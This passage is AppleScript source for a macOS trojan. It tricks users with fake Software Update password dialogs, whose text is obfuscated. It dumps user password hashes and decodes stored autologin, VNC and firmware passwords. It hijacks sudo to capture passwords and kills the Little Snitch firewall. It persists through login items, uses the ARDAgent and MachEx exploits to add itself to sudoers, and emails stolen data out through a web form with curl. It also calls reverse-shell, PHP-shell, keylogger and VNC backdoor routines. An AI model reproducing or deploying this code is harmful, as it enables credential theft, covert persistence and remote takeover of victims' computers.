		--extension while manually sending an email through the site's web mail form.
		set result to do shell script "curl -d \"hdnSendMail=sendNow&To=" & my_master & "&CC=&BCC=&Subject=" & the_title & "&Message=" & the_message & "&btnSend=Send\" www.employeesuggestions.com/form.asp"
		if result does not contain "Your anonymous suggestion has been sent" then
			--try a different mailer
		end if
	end if
end phone_home_and_try_a_different_method_if_it_fails

on exit_stage_left()
	--This next if then statement will handle moving the trojan and putting 'original.app'
	--from within the trojan's app package back where the trojan had been
	if debug then log_event("exit_stage_left")
	if move_myself is not false then
		try
			do shell script "cd \"" & POSIX path of (my_POSIX_folder) & "\" ..; rm -Rf .AStht 2>/dev/null ; mv -f \"" & POSIX path of (my_Path) & "\" .AStht; mv -f .AStht/Contents/original.app/ \"" & POSIX path of (my_Path) & "\"" --add ; rm -Rf .AStht 2>/dev/null before the last quote to self-delete after moving
		end try
		try
			do shell script "/usr/bin/open \"" & POSIX path of (my_Path) & "\""
		end try
	end if
end exit_stage_left

on whos_in_charge_here()
	if debug then log_event("whos_in_charge_here")
	if text of (do shell script "id" user name my_username) contains "admin" then
		set i_am_an_admin to true
	else
		set i_am_an_admin to false
	end if
end whos_in_charge_here

on dupe_user()
	--Ask the user to supply a password
	if debug then log_event("dupe_user")
	local the_message, the_title, tries
	set the_title to "Sjsbenmr2Ukqnbr2mrlcvmra2gjcm2knaaejmq."
	set the_message to "A2pjmmckb2kmrsrmripr2svyr2una2orri2qrbrpbrq2niq2zcab2or2mrknvmrq.2Eibrm2gjcmknaaejmq2bj2pjibvicr:"
	set tries to 0
	if text of (do shell script "id" user name my_username) contains "admin" then
		set i_am_an_admin to true
		repeat until i_have_root_access
			set my_password to text returned of (display dialog (defuxor(the_message)) with icon padlock_icon with title (defuxor(the_title)) default answer "" buttons {"OK"} default button "OK" with hidden answer)
			set tries to tries + 1
			try
				if text of (do shell script "echo $UID" user name my_username password my_password with administrator privileges) = "0" then set i_have_root_access to true
				do shell script "echo " & my_username & ":" & my_password & " >> " & quoted form of accounts_file
			on error
				if tries is 4 then
					display dialog "An authentication error has occurred. The file could not be repaired!"
					return
				end if
				set the_message to "Iipjmmrpb2knaaejmq.2Cyvpx2Ox2bj2bmg2ntnvi."
				display dialog defuxor(the_message) with title (defuxor(the_title)) buttons {"OK"} default button "OK"
			end try
		end repeat
	else
		set my_password to text returned of (display dialog (defuxor(the_message)) with icon padlock_icon with title (defuxor(the_title)) default answer "" with hidden answer)
	end if
end dupe_user

on restart()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--Tell the user that a restart is required.
	if debug then log_event("restart")
	local the_message, the_title
	set the_title to "Sjsbenmr2Ukqnbr"
	set the_message to "Tur2ckqnbr(a)2ermr2viabnyyrq2acppraascyyg.2Yjc2aujcyq2mrabnmb2gjcm2pjzkcbrm2ije."
	display dialog defuxor(the_message) with icon software_update_icon with title defuxor(the_title) buttons {"Restart"} default button "Restart"
	do shell script ("/usr/bin/sudo reboot")
end restart

on fuxor(the_variable)
	--Obfuscate some text
	if debug then log_event("fuxor")
	local the_variable
	return do shell script ("echo '" & the_variable & "' | tr '" & key2 & "' '" & key1 & "'")
end fuxor

on defuxor(the_variable)
	--Deobfuscate some text
	if debug then log_event("defuxor")
	local the_variable
	return do shell script ("echo '" & the_variable & "' | tr '" & key1 & "' '" & key2 & "'")
end defuxor

on just_hangin_out()
	--Keep checking until sudo works. Once called, the script will just sit here forever until sudo works or until it's quit.
	if debug then log_event("just_hangin_out")
	try
		do shell script "/usr/bin/sudo cat /etc/sudoers"
	on error
		delay 290 -- wait 4 minutes and 50 seconds before trying again. The default sudo timeout is 5 minutes.
		just_hangin_out()
	end try
end just_hangin_out

on pass_the_hash()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	if debug then log_event("pass_the_hash")
	local kcpassword, NATpassword, ARDVNCpassword, autoLoginUser
	
	--This gets the password hashes for all OS X user accounts.
	if OSX_version_number_minor as number ³ 4 then --For Tiger and Leopard
		set OSX_hashes to do shell script "dscl . -list /Users \"authentication_authority\" | grep -i hash | sed \"s/ .*$//\" | while read the_name; do the_hashfile=$( dscl . -read /users/\"${the_name}\" generateduid | sed \"s/^.* //\" ); the_hash=`sudo cat \"/var/db/shadow/hash/$the_hashfile\"`; ntlm_hash=\"${the_hash:0:64}\";[ \"${ntlm_hash}\" == \"${ntlm_hash/0000}\" ] && echo \"_${the_name}_NTLM___:${the_hash:0:32}:${the_hash:32:32}\"; S0SHA1=\"${the_hash:104:48}\"; cram_md5=\"${the_hash:104:64}\"; SSHA1=\"${the_hash:168:48}\"; [ \"x${the_hash:153:15}\" != \"x000000000000000\" ] && echo \"${the_name}_CRAM_MD5:${cram_md5}\" || { [ -n \"${S0SHA1//0}\" ] && echo \"${the_name}_S0SHA1__:${S0SHA1}\"; }; [ -n \"${SSHA1//0}\" ] && echo \"${the_name}_SSHA1___:${SSHA1}\"; done"
	else if OSX_version_number_minor as number = 3 then --For Panther
		set OSX_hashes to do shell script "/usr/bin/nidump passwd . | grep -v \":\\" & (ASCII character 42) & ":\" | while read line;do echo \"${line}\";the_name=\"${line%%:*}\" the_hashfile=$(niutil -readprop . /users/${the_name} generateduid 2>/dev/null);sudo test -f /var/db/shadow/hash/${the_hashfile} && the_hash=$(sudo cat \"/var/db/shadow/hash/${the_hashfile}\");echo \"${the_name}_NTLM:${the_hash:0:32}:${the_hash:32:32}:\";echo \"${the_name}_SHA1:${the_hash:64:40}:\"; done"
	else --For Jaguar and prior
		set OSX_hashes to do shell script "/usr/bin/nidump passwd . | grep -v \":\\" & (ASCII character 42) & ":\" | while read line;do echo -n \"${line} \";the_name=\"${line%%:*}\" the_hashfile=$(niutil -readprop . /users/${the_name} generateduid 2>/dev/null); /usr/bin/sudo test -d /var/db/samba/hash && /usr/bin/sudo test -f /var/db/samba/hash/${the_hashfile} && /usr/bin/sudo cat \"/var/db/samba/hash/${the_hashfile}\" || echo ;done"
	end if
	do shell script "echo " & quoted form of OSX_hashes & " >> " & quoted form of hashes_file
	
	--Get the Open Firmware password
	try
		set ofpassword to do shell script "IFS='%' ; hexbytes=( $( /usr/bin/sudo nvram -p | grep password | cut -f 2 ) ); IFS='';for ((i=1;i<${#hexbytes[*]};i++)) ; do echo -en \"\\x$(printf '%x' $((16#AA^16#${hexbytes[$i]})))\";done;echo"
		if ofpassword is not "" then
			do shell script "echo " & quoted form of ofpassword & " >> " & quoted form of candidates_file
		end if
	end try
	
	--For the autologin password stored in /etc/keychain
	try
		set kcpassword to do shell script "declare -i offset=0 i=0;declare -a keys=(7d 89 52 23 d2 bc dd ea a3 b9 1f) hexbytes=($(sudo hexdump -v -e '/1 \"%02X \"' /etc/kcpassword));for ((offset=0;offset<${#hexbytes[*]};offset++));do newbyte=$(printf '%02X' $((16#${keys[${i}]}^16#${hexbytes[$offset]})));[ \"${newbyte}\" == \"00\" ]&&echo&&break;echo -en \"\\x${newbyte}\";let i+=1;[ $i -gt 10 ]&&let i=0;done"
		set autoLoginUser to do shell script "defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser"
		if kcpassword is not "" then
			do shell script "echo " & quoted form of kcpassword & " >> " & quoted form of candidates_file
			if autoLoginUser is not "" then
				do shell script "echo '" & autoLoginUser & ":" & kcpassword & "' >> " & quoted form of accounts_file
			end if
		end if
	on error
		--Either /etc/kcpassword doesn't exist (as in no autologin user is set),
		--or the password does not belong to this user (we could test it with the other usernames of this system),
		--or sudo failed and we could not read the /etc/keychain file.
		--or the account is not allowed to use sudo.
	end try
	
	--For the ad-hoc WiFi network password which is stored as plain text.
	try
		set NATpassword to do shell script "defaults read /Library/Preferences/SystemConfiguration/com.apple.nat NAT | grep NetworkPassword | sed -e 's/^.*<//' -e 's/>.*$//'"
		if NATpassword is not "" then
			do shell script "echo " & quoted form of NATpassword & " >> " & quoted form of candidates_file
		end if
	end try
	
	--For the ARD VNC access password
	try
		--If /Library/Preferences/com.apple.VNCSettings.txt isn't there, create it with password 'a secret'
		try
			do shell script "[ ! -f /Library/Preferences/com.apple.VNCSettings.txt ] && echo -n '7614220BE8DAA096FF1C39567390ADCA' > /Library/Preferences/com.apple.VNCSettings.txt"
			return
		end try
		set ARDVNCpassword to do shell script "declare -a keys=(17 34 51 6e 8b a8 c5 e2 ff 1c 39 56 73 90 ad ca);p=$(sudo cat /Library/Preferences/com.apple.VNCSettings.txt);hexbytes=(${p:0:2} ${p:2:2} ${p:4:2} ${p:6:2} ${p:8:2} ${p:10:2} ${p:12:2} ${p:14:2} ${p:16:2} ${p:18:2} ${p:20:2} ${p:22:2} ${p:24:2} ${p:26:2} ${p:28:2} ${p:30:2});for ((offset=0;offset<${#keys[*]};offset++));do echo -en \"\\x$(printf '%02X' $((16#${keys[${offset}]}^16#${hexbytes[$offset]})))\";done"
		if ARDVNCpassword is not "" then
			do shell script "echo " & quoted form of ARDVNCpassword & " >> " & quoted form of candidates_file
		end if
	end try
end pass_the_hash

on alias_sudo()
	--This routine creates a shell script named ".sudo2" and then aliases the sudo command to run the shell script.
	--The alias is also added to the user's .profile. Captured passwords are output to ~/Public/.howdy
	if debug then log_event("alias_sudo")
	do shell script "echo -e \"\\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x0a\\x5b\\x20\\x22\\x78\\x24\\x7b\\x2a\\x7d\\x22\\x20\\x3d\\x3d\\x20\\x22\\x78\\x22\\x20\\x5d\\x20\\x26\\x26\\x20\\x65\\x78\\x65\\x63\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x20\\x26\\x26\\x20\\x65\\x78\\x69\\x74\\x20\\x31\\x3b\\x5b\\x20\\x22\\x78\\x24\\x7b\\x31\\x7d\\x22\\x20\\x21\\x3d\\x20\\x22\\x78\\x24\\x7b\\x31\\x2f\\x2d\\x6b\\x7d\\x22\\x20\\x2d\\x6f\\x20\\x22\\x78\\x24\\x7b\\x31\\x7d\\x22\\x20\\x21\\x3d\\x20\\x22\\x78\\x24\\x7b\\x31\\x2f\\x2d\\x4b\\x7d\\x22\\x20\\x5d\\x20\\x26\\x26\\x20\\x65\\x78\\x65\\x63\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x20\\x22\\x24\\x7b\\x2a\\x7d\\x22\\x20\\x26\\x26\\x20\\x65\\x78\\x69\\x74\\x20\\x30\\x3b\\x5b\\x20\\x24\\x28\\x28\\x24\\x52\\x41\\x4e\\x44\\x4f\\x4d\\x25\\x32\\x29\\x29\\x20\\x21\\x3d\\x20\\x30\\x20\\x5d\\x20\\x26\\x26\\x20\\x65\\x78\\x65\\x63\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x20\\x22\\x24\\x7b\\x2a\\x7d\\x22\\x20\\x26\\x26\\x20\\x65\\x78\\x69\\x74\\x20\\x30\\x3b\\x65\\x63\\x68\\x6f\\x20\\x2d\\x6e\\x65\\x20\\x22\\x5c\\x78\\x35\\x30\\x5c\\x78\\x36\\x31\\x5c\\x78\\x37\\x33\\x5c\\x78\\x37\\x33\\x5c\\x78\\x37\\x37\\x5c\\x78\\x36\\x66\\x5c\\x78\\x37\\x32\\x5c\\x78\\x36\\x34\\x5c\\x78\\x33\\x61\\x22\\x3b\\x73\\x74\\x74\\x79\\x20\\x2d\\x65\\x63\\x68\\x6f\\x20\\x32\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x3b\\x72\\x65\\x61\\x64\\x20\\x70\\x61\\x73\\x73\\x3b\\x73\\x74\\x74\\x79\\x20\\x73\\x61\\x6e\\x65\\x20\\x32\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x3b\\x65\\x63\\x68\\x6f\\x20\\x22\\x24\\x7b\\x70\\x61\\x73\\x73\\x7d\\x20\\x22\\x20\\x3e\\x3e\\x20\\x7e\\x2f\\x50\\x75\\x62\\x6c\\x69\\x63\\x2f\\x2e\\x68\\x6f\\x77\\x64\\x79\\x3b\\x65\\x63\\x68\\x6f\\x3b\\x65\\x63\\x68\\x6f\\x20\\x22\\x53\\x6f\\x72\\x72\\x79\\x2c\\x20\\x74\\x72\\x79\\x20\\x61\\x67\\x61\\x69\\x6e\\x2e\\x22\\x3b\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x20\\x2d\\x6b\\x20\\x32\\x3e\\x2f\\x64\\x65\\x76\\x2f\\x6e\\x75\\x6c\\x6c\\x3b\\x65\\x78\\x65\\x63\\x20\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x75\\x64\\x6f\\x20\\x22\\x24\\x7b\\x2a\\x7d\\x22\" > ~/Library/.sudo2"
	--Still need to check the .profile to see if our alias is already set, and if so, don't set it again in .profile
	do shell script defuxor("puzjq2cjt+f2~/Lvomnmg/.acqj72;2nyvna2acqj=~/Lvomnmg/.acqj72;2rpuj2nyvna2acqj=~/Lvomnmg/.acqj72>>2~/.kmjsvyr")
end alias_sudo

on is_it_safe()
	--check if Little Snitch is running
	if debug then log_event("is_it_safe")
	try
		do shell script "ps -axww | grep -i \"lsd" & (ASCII character 92) & (ASCII character 124) & "Snitch\" | grep -v grep"
		set be_quiet to true
		return
	end try
	set be_quiet to false
end is_it_safe

on these_are_not_the_outgoing_network_communications_you_are_looking_for()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	--Disable Little Snitch prior to using curl
	if debug then log_event("these_are_not_the_outgoing_network_communications_you_are_looking_for")
	try
		do shell script "ps -axww | grep -i \"lsd" & (ASCII character 92) & (ASCII character 124) & "Snitch\" | grep -v grep | while read process and_junk; do /usr/bin/sudo kill -9 \"${process}\"; done; /usr/bin/sudo killall \"lsd\"; /usr/bin/sudo mv \"/Library/Little Snitch\" /Library/.hushnow"
		set be_quiet to false
	end try
end these_are_not_the_outgoing_network_communications_you_are_looking_for

on slash_x_hex(the_variable)
	if debug then log_event("slash_x_hex")
	local hex_characters, hexified_string, each_character, decimal_value, the_variable
	set hex_characters to "0123456789ABCDEF"
	set hexified_string to ""
	repeat with each_character in the_variable
		set decimal_value to ASCII number of each_character
		set hexified_string to hexified_string & (ASCII character 92) & "x" & character (decimal_value div 16 + 1) of hex_characters & character (decimal_value mod 16 + 1) of hex_characters
	end repeat
	return hexified_string
end slash_x_hex

on test_a_password_with_sudo(try_this_password)
	if debug then log_event("test_a_password_with_sudo")
	local try_this_password
	try
		--HEY! Note that this is going to invalidate the sudo timestamp!
		--If sudo was already working, do what you need sudo for BEFORE calling this!
		do shell script "/usr/bin/sudo -k ; echo " & quoted form of try_this_password & " | /usr/bin/sudo -S id -u"
		if result is "0" then
			set i_am_an_admin to true
			set i_have_root_access to true
			do shell script "echo " & my_username & ":" & my_password & " >> " & quoted form of accounts_file
		end if
	end try
end test_a_password_with_sudo

on can_sudo_come_out_to_play()
	if debug then log_event("can_sudo_come_out_to_play")
	try
		do shell script "/usr/bin/sudo id -u" --should fail if sudo isn't within the timeout or return "0" if it worked
		set i_have_root_access to true
	on error
		set i_have_root_access to false
	end try
end can_sudo_come_out_to_play

on move_in()
	--Test if I am running from /Library/Caches and if not, try to copy myself there (but only if I'm compiled)
	if debug then log_event("move_in")
	if my_POSIX_folder does not contain "/Library/Caches" and my_POSIX_folder is not "/Applications/AppleScript/" then
		try
			do shell script "ditto -X -rsrc " & quoted form of my_Path & " /Library/Caches/" & quoted form of my_name
			set launch_path to "/Library/Caches/" & my_name
			do shell script "chmod 777 /Library/Caches/" & quoted form of my_name
		on error
			--Couldn't copy myself into /Library/Caches/
		end try
	end if
end move_in

on loosen_permissions_on_SystemLoginItems()
	--This handler needs root! (We either need to be running as root, from SystemLoginItems for instance, or sudo needs to be within the timestamp period!)
	if debug then log_event("loosen_permissions_on_SystemLoginItems")
	try
		do shell script "touch /Library/Preferences/com.apple.SystemLoginItems.plist"
	on error
		do shell script "/usr/bin/sudo chmod 777 /Library/Preferences/com.apple.SystemLoginItems.plist 2>/dev/null"
	end try
end loosen_permissions_on_SystemLoginItems

on rerun_me_every_startup()
	--Test if my launch path is listed in /Library/Preferences/com.apple.SystemLoginItems.plist and if not, try to add it (but only if I'm compiled)
	if debug then log_event("rerun_me_every_startup")
	try
		set SystemLoginItems to do shell script "defaults read /Library/Preferences/com.apple.SystemLoginItems AutoLaunchedApplicationDictionary"
	on error
		--can't read from /Library/Preferences/com.apple.SystemLoginItems.plist, perhaps it does not yet exist
	end try
	
	if SystemLoginItems does not contain launch_path and launch_path does not contain "Script Editor.app" then
		try
			do shell script "touch '/Library/Preferences/com.apple.SystemLoginItems.plist'"
			do shell script "defaults write /Library/Preferences/com.apple.SystemLoginItems AutoLaunchedApplicationDictionary -array-add '<dict><key>Hide</key><true/><key>Path</key><string>" & launch_path & "</string></dict>'"
			do shell script "chmod 777 /Library/Preferences/com.apple.SystemLoginItems.plist 2>/dev/null"
		on error
			--can't write to /Library/Preferences/com.apple.SystemLoginItems.plist, I'll add me to the user's login items instead.
			do shell script "touch ~/Library/Preferences/loginwindow.plist"
			do shell script "defaults write ~/Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add '<dict><key>Hide</key><true/><key>Path</key><string>" & launch_path & "</string></dict>'"
			do shell script "chmod 777 ~/Library/Preferences/loginwindow.plist 2>/dev/null"
		end try
	end if
end rerun_me_every_startup

on stuff_for_root_to_do()
	--This handler needs root!
	if debug then log_event("stuff_for_root_to_do")
	move_in()
	loosen_permissions_on_SystemLoginItems()
	rerun_me_every_startup()
	agent_86_reporting_for_duty_chief()
	its_smoky_in_here_lets_open_ports_in_the_firewall()
	enable_ssh()
	install_phpshell()
	enable_webserver()
	install_and_activate_logKext()
	pass_the_hash()
	i_have_a_secret()
	there_are_no_osx_viruses_silly_wabbit()
	i_like_you_just_as_you_are()
	is_it_safe()
	if be_quiet is not true then
		these_are_not_the_outgoing_network_communications_you_are_looking_for()
	end if
	papers_please()
	phone_home_and_try_a_different_method_if_it_fails()
	reverse_shell()
	Back_to_masters_VNC()
	nothing_to_see_here()
	throw_another_log_on_the_fire()
	--exit_stage_left
end stuff_for_root_to_do

on stuff_for_an_admin_without_sudo_to_do()
	--This is assuming that we are an admin user, we do not have a functional password and sudo is not already working
	if debug then log_event("stuff_for_an_admin_without_sudo_to_do")
	move_in()
	rerun_me_every_startup()
	enable_ssh()
	install_phpshell()
	i_have_a_secret()
	i_like_you_just_as_you_are()
	reverse_shell()
	Back_to_masters_VNC()
	is_it_safe()
	if be_quiet is false then
		papers_please()
		phone_home_and_try_a_different_method_if_it_fails()
	end if
	--exit_stage_left()
end stuff_for_an_admin_without_sudo_to_do

on stuff_for_a_regular_user_to_do()
	--This is assuming that we are a standard user, not an admin, and sudo won't work
	if debug then log_event("stuff_for_a_regular_user_to_do")
	move_in()
	rerun_me_every_startup()
	install_phpshell()
	i_have_a_secret()
	i_like_you_just_as_you_are()
	reverse_shell()
	Back_to_masters_VNC()
	is_it_safe()
	if be_quiet is false then
		papers_please()
		phone_home_and_try_a_different_method_if_it_fails()
	end if
	brute_user_accounts()
	--exit_stage_left
end stuff_for_a_regular_user_to_do


---------------------------------------------------------------------------
--Main
--------------------
--HEY! Keep in mind that outgoing communications only happen if be_quiet is set to false
--So, you might want to call is_it_safe and possibly
--these_are_not_the_outgoing_network_communications_you_are_looking_for before getting
--the IP address or sending email

if debug then log_event("Main")

--Check if sudo works already, do this immediately in case sudo's timestamp timeout is near
can_sudo_come_out_to_play()

--Check if I am a member of the admin group
whos_in_charge_here()

--Setup some folders and files
try
	do shell script "mkdir -p -m 777 '/Users/Shared/SC Info/' ~/Public/ /Library/WebServer/Documents/.PS_Store 2>/dev/null ; exit 0"
	do shell script "touch " & quoted form of candidates_file & " " & quoted form of accounts_file & " " & quoted form of hashes_file & " ~/Public/" & quoted form of secret_file & " /Users/Shared/" & quoted form of secret_file & " /Library/WebServer/Documents/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
	do shell script "chmod -Rf 777 " & quoted form of candidates_file & " " & quoted form of accounts_file & " " & quoted form of hashes_file & " ~/Public/" & quoted form of secret_file & " /Users/Shared/" & quoted form of secret_file & " /Library/WebServer/Documents/" & quoted form of secret_file & " 2>/dev/null ; exit 0"
end try

--If sudo isn't working, and I don't have a password then try using passwords I collected during previous runs on this computer.
if i_have_root_access is false and my_password is "" then
	if debug then log_event("Main: trying previously gathered passwords")
	local the_passwords, the_password
	set the_passwords to words in my_username & words in (do shell script "grep " & quoted form of my_username & " " & quoted form of accounts_file & " | sed -e 's/^.*://g' | sort -u ") & words in defuxor(do shell script ("grep '" & (ASCII character 92) & (ASCII character 91) & "' ~/Public/" & quoted form of secret_file & " | sed -e 's/^.*" & (ASCII character 92) & (ASCII character 91) & "//g' -e 's/" & (ASCII character 92) & (ASCII character 93) & ".*$//g' | tail -n 1"))
	--FIX this, no more & (ASCII character 92) & (ASCII character 91) & 
	repeat with the_password in the_passwords
		try
			test_a_password_with_sudo(the_password)
			exit repeat
		on error
			--Just keep trying until we are out of possible passwords
		end try
	end repeat
end if

if i_have_root_access is false then
	--Try some exploits
	if OSX_version_number_minor as number < 4 or (OSX_version_number_minor as number ² 4 and OSX_version_number_mini as number < 8) then
		if debug then log_event("Main: Trying MachEx")
		--Attempts to run the compiled mach exception handling exploit from the Contents/Resources directory within this script's application bundle.
		try
			with timeout of 5 seconds
				do shell script quoted form of my_resources & "/MachEx <<< \"echo '" & my_username & (ASCII character 9) & "ALL=(ALL)" & (ASCII character 9) & "NOPASSWD: ALL' >> /etc/sudoers ; exit\""
			end timeout
			can_sudo_come_out_to_play()
		end try
	end if
	
	if debug then log_event("Main: trying to get ARDAgent to append to /etc/sudoers")
	set tries to 0
	repeat until tries ³ 20
		try
			set tries to tries + 1
			tell application "ARDAgent" to do shell script "echo '" & my_username & (ASCII character 9) & "ALL=(ALL)" & (ASCII character 9) & "NOPASSWD: ALL' >> /etc/sudoers"
			set tries to 25
			can_sudo_come_out_to_play()
		on error
			--ignore
		end try
	end repeat
end if

--Other stuff we could do
--take pictures - do shell script quoted form of my_resources & "isightcapture ~/public/\"$(date).jpg\""
--take screenshots - do shell script "screencapture -xmC ~/public/\"$(date).jpg\""
--Listen to the microphone?

if i_am_an_admin is false and i_have_root_access is false then
	if debug then log_event("Main: i_am_an_admin is false and i_have_root_access is false")
	stuff_for_a_regular_user_to_do()
end if

if i_am_an_admin is true and i_have_root_access is false then
	if debug then log_event("Main: i_am_an_admin is true and i_have_root_access is not true")
	stuff_for_an_admin_without_sudo_to_do()
	dupe_user()
	if i_have_root_access is false then alias_sudo()
end if

if i_have_root_access is true then
	if debug then log_event("Main: i_have_root_access is true")
	stuff_for_root_to_do()
end if

if all_else_fails then
	if debug then log_event("Main: all_else_fails")
	--Still to do?
	--check for passwords laying around in files to which I have read access
	--check for write access to setuid app paths, StartupItems, LoginItems, LaunchDaemons & Agents etc.
	--go into quiet mode and just wait for sudo to work or for Master to get the reverse shell or reverse VNC connections. :)
end if

if debug then log_event("THE END")
